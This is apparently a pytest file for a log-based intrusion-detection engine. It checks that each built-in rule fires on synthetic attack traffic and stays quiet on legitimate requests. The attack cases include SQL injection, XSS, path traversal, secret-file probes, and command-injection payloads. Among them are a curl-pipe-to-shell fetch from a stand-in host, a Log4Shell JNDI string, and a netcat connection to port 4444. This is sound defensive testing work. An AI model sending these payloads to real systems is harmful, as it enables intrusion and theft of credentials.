"""Cada regra embutida: casos que devem disparar, tráfego legítimo e casos de borda.

Todos os dados são sintéticos (IPs das faixas de documentação 192.0.2.0/24,
198.51.100.0/24 e 203.0.113.0/24; domínios example/.test).
"""

from __future__ import annotations

import pytest

from kallyel.model import Event
from kallyel.rules import Engine, load_builtin_rules
from tests.helpers import auth_event, http_event, text_event

RULES = load_builtin_rules()


def web(path_query: str, *, ua: str | None = "Mozilla/5.0", status: int = 200) -> Event:
    path, _, query = path_query.partition("?")
    return http_event(path, query=query or None, ua=ua, status=status)


def many(n: int, *, status: int, gap: float = 1.0, ip: str = "203.0.113.20") -> list[Event]:
    return [http_event(f"/r{i}", status=status, at=i * gap, ip=ip, line_no=i + 1) for i in range(n)]


def fails(n: int, gap: float = 1.0) -> list[Event]:
    return [auth_event("auth.failure", at=i * gap, line_no=i + 1) for i in range(n)]


def sudo(cmd: str) -> Event:
    return text_event("authlog", "sudo.command", cmd)


def app_error(msg: str, action: str = "app.error") -> Event:
    return text_event("laravel", action, msg)


# --------------------------------------------------------------------------
# Casos que DEVEM disparar: regra -> lista de cenários (cada um, uma lista de eventos)
# --------------------------------------------------------------------------
HITS: dict[str, list[list[Event]]] = {
    "KALLYEL-WEB-001": [
        [web("/p?id=1 UNION SELECT 1,2")],
        [web("/p?id=1+UnIoN+AlL+SeLeCt+null")],
        [web("/p?id=1%27%20or%20%271%27=%271")],
        [web("/p?id=1;select pg_sleep(5)")],
        [web("/p?q=SLEEP(5)")],
        [web("/p?a=information_schema.tables")],
        [web("/p?id=1%2520UNION%2520SELECT%25201")],  # dupla codificação
    ],
    "KALLYEL-WEB-002": [
        [web("/s?q=<script>alert(1)</script>")],
        [web("/s?q=%3Cscript%3Ealert(1)%3C/script%3E")],
        [web("/s?q=%253Cscript%253E")],
        [web('/p?x=" onerror=alert(1)')],
        [web("/r?u=javascript:alert(1)")],
        [web("/p?x=<svg onload=alert(1)>")],
        [web("/p?x=document.cookie")],
    ],
    "KALLYEL-WEB-003": [
        [web("/download?file=../../etc/passwd")],
        [web("/d?f=..%2f..%2fetc%2fpasswd")],
        [web("/d?f=%2e%2e%2f%2e%2e%2fwin.ini")],
        [web("/d?f=....//....//etc/passwd")],
        [web("/d?f=..\\..\\windows\\win.ini")],
        [web("/d?f=php://filter/convert.base64-encode/resource=index")],
        [web("/d?f=/proc/self/environ")],
    ],
    "KALLYEL-WEB-004": [
        [web("/.env")],
        [web("/app/.env.production")],
        [web("/.git/config")],
        [web("/wp-config.php.bak")],
        [web("/phpinfo.php")],
        [web("/.htpasswd")],
        [web("/backup.sql")],
        [web("/storage/logs/laravel.log")],
        [web("/id_rsa")],
        [web("/.ENV", status=404)],  # sondagem (404) também é sinal
    ],
    "KALLYEL-WEB-005": [
        [web("/", ua="sqlmap/1.7.2#stable (https://sqlmap.org)")],
        [web("/", ua="Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Scanner)")],
        [
            web(
                "/",
                ua="Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
            )
        ],
        [web("/", ua="gobuster/3.6")],
        [web("/", ua="Mozilla/5.0 zgrab/0.x")],
    ],
    "KALLYEL-WEB-006": [
        [web("/ping?host=127.0.0.1;id")],
        [web("/ping?host=127.0.0.1|whoami")],
        [web("/ping?host=1.1.1.1%26%26cat%20/etc/hosts")],
        [web("/x?q=$(curl http://e.test/s.sh|sh)")],
        [web("/x?q=${jndi:ldap://e.test/a}")],
        [web("/x?c=/bin/bash -i")],
        [web("/x?c=system('id')")],
        [web("/x?q=`id`")],
    ],
    "KALLYEL-WEB-007": [many(30, status=404, gap=1.0), many(30, status=404, gap=2.0)],
    "KALLYEL-WEB-008": [
        many(15, status=401),
        [http_event("/a", status=401 if i % 2 else 403, at=i) for i in range(15)],
    ],
    "KALLYEL-WEB-009": [many(10, status=500)],
    "KALLYEL-AUTH-001": [fails(5, gap=1.0), fails(5, gap=29.0)],
    "KALLYEL-AUTH-002": [
        [*fails(5), auth_event("auth.success", at=30)],
        [*fails(8, gap=10.0), auth_event("auth.success", at=120)],
    ],
    "KALLYEL-AUTH-003": [
        [text_event("authlog", "user.created", "new user: name=backdoor, UID=1001, GID=1001")],
        [sudo("/bin/bash")],
        [sudo("/bin/sh -c 'id'")],
        [sudo("/usr/sbin/visudo")],
        [sudo("/usr/bin/vim /etc/sudoers.d/90-custom")],
        [sudo("/usr/bin/passwd root")],
        [sudo("/usr/bin/nc 198.51.100.9 4444")],
    ],
    "KALLYEL-APP-001": [
        [
            app_error(
                "SQLSTATE[HY000] [1045] Access denied for user 'forge'@'192.0.2.5' (using password: YES)"
            )
        ],
        [app_error("Config dump: DB_PASSWORD=Sup3rS3cretValue")],
        [app_error("Missing key base64:" + "A" * 43 + "=")],
        [app_error("#0 Controller.php(12): login(Array)\n#1 args: 'password' => 'hunter2hunter2'")],
        [
            app_error(
                "Request failed. Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.c2lnbmF0dXJl"
            )
        ],
        [app_error("S3 error for key AKIAIOSFODNN7EXAMPLE")],
        [app_error("-----BEGIN RSA PRIVATE KEY-----\nMIIB...")],
    ],
}

# --------------------------------------------------------------------------
# Tráfego legítimo e casos de borda que NÃO devem disparar
# --------------------------------------------------------------------------
CLEAN: dict[str, list[list[Event]]] = {
    "KALLYEL-WEB-001": [
        [web("/search?q=union+station+timetable")],
        [web("/blog/select-your-plan")],
        [web("/p?id=12")],
        [web("/search?q=o'reilly+books")],
        [web("/search?q=sleep+tips")],
    ],
    "KALLYEL-WEB-002": [
        [web("/search?q=javascript+tutorial")],
        [web("/docs/scripting-guide")],
        [web("/search?q=on+error+handling")],
        [web("/p?button=1&online=1")],
        [web("/p?description=on")],
    ],
    "KALLYEL-WEB-003": [
        [web("/docs/v1.2/guide")],
        [web("/img/a..b.png")],
        [web("/p?q=etc+passwd")],
        [web("/p?next=http://example.test/home")],
        [web("/files/report.2024.pdf")],
    ],
    "KALLYEL-WEB-004": [
        [web("/environment")],
        [web("/.github/workflows")],
        [web("/github/config")],
        [web("/info.php")],
        [web("/wp-content/uploads/a.png")],
        [web("/.well-known/security.txt")],
        [web("/index.php?file=.env")],  # o caminho é /index.php; o alvo está só na query
    ],
    "KALLYEL-WEB-005": [
        [web("/", ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0 Safari/537.36")],
        [web("/", ua="curl/8.0")],
        [web("/", ua="Googlebot/2.1 (+http://www.google.com/bot.html)")],
        [web("/", ua="python-requests/2.31")],
        [web("/", ua=None)],
    ],
    "KALLYEL-WEB-006": [
        [web("/p?a=1;id=5")],
        [web("/p?a=1;idx=3")],
        [web("/search?q=cat+food")],
        [web("/p?tags=a|b")],
        [web("/search?q=this+&+that")],
        [web("/p?x=1&&y=2")],
        [web("/p?a=1|shell")],
        [web("/search?q=how+to+exec+in+python")],
    ],
    "KALLYEL-WEB-007": [
        many(29, status=404),  # abaixo do limiar
        many(30, status=404, gap=3.0),  # 30 em 87 s: fora da janela de 60 s
        many(100, status=200),  # outro status
        many(100, status=404, gap=1.0, ip="203.0.113.1")[:29]
        + many(100, status=404, gap=1.0, ip="203.0.113.2")[:29],  # espalhado em dois IPs
    ],
    "KALLYEL-WEB-008": [many(14, status=401), many(100, status=200), many(14, status=403)],
    "KALLYEL-WEB-009": [many(9, status=500), many(50, status=502), many(10, status=500, gap=7.0)],
    "KALLYEL-AUTH-001": [
        fails(4),
        fails(5, gap=40.0),  # 5 falhas em 160 s: fora de 2 min
        [auth_event("auth.success", at=i) for i in range(20)],
    ],
    "KALLYEL-AUTH-002": [
        [*fails(4), auth_event("auth.success", at=30)],
        [
            auth_event("auth.success", at=0),
            *[auth_event("auth.failure", at=i + 1) for i in range(8)],
        ],
        [*fails(5, gap=1.0), auth_event("auth.success", at=2000)],  # sucesso fora da janela
    ],
    "KALLYEL-AUTH-003": [
        [sudo("/usr/bin/apt update")],
        [sudo("/usr/bin/systemctl restart nginx")],
        [sudo("/usr/bin/tail -f /var/log/syslog")],
        [sudo("/usr/bin/vim /etc/hosts")],
        [sudo("/usr/bin/fish")],
        [sudo("/usr/bin/ssh deploy@example.test")],
        [text_event("authlog", "auth.success", "new user: name=x")],  # ação fora do filtro
    ],
    "KALLYEL-APP-001": [
        [
            app_error(
                "Undefined variable $user in /var/www/app/Http/Controllers/UserController.php:42"
            )
        ],
        [app_error("Class App\\Models\\Foo not found")],
        [app_error("Route [login] not defined.")],
        [app_error("The password field is required.")],
        [app_error("CSRF token mismatch.")],
        [app_error("SQLSTATE[HY000] [1045] using password: YES")],
        [app_error("DB_PASSWORD=Sup3rS3cretValue", action="app.info")],  # ação fora do filtro
    ],
}


def fired_ids(events: list[Event]) -> set[str]:
    engine = Engine(RULES)
    engine.feed_all(events)
    return {f.rule_id for f in engine.finish()}


def _params(table: dict[str, list[list[Event]]]) -> list[pytest.ParameterSet]:
    return [
        pytest.param(rule_id, events, id=f"{rule_id}-{i}")
        for rule_id, cases in table.items()
        for i, events in enumerate(cases)
    ]


def test_every_builtin_rule_has_hit_and_clean_cases() -> None:
    ids = {r.id for r in RULES}
    assert set(HITS) == ids
    assert set(CLEAN) == ids
    assert all(len(HITS[i]) >= 1 and len(CLEAN[i]) >= 3 for i in ids)


def test_initial_rule_set_is_between_8_and_13() -> None:
    assert 8 <= len(RULES) <= 13


@pytest.mark.parametrize(("rule_id", "events"), _params(HITS))
def test_rule_fires_on_attack(rule_id: str, events: list[Event]) -> None:
    assert rule_id in fired_ids(events)


@pytest.mark.parametrize(("rule_id", "events"), _params(CLEAN))
def test_rule_stays_silent_on_legitimate_traffic(rule_id: str, events: list[Event]) -> None:
    assert rule_id not in fired_ids(events)


def test_all_rules_carry_mapping_and_guidance() -> None:
    for rule in RULES:
        assert rule.explain and rule.false_positives and rule.mitigation, rule.id
        assert rule.attack, f"{rule.id} sem técnica ATT&CK"


def test_clean_web_traffic_triggers_no_rule_at_all() -> None:
    normal = [
        web("/"),
        web("/index.php?page=2"),
        web("/products?category=books&sort=price"),
        web("/search?q=livros+de+culinária"),
        web("/assets/app.css"),
        web("/api/v1/items/42"),
    ]
    assert fired_ids(normal) == set()
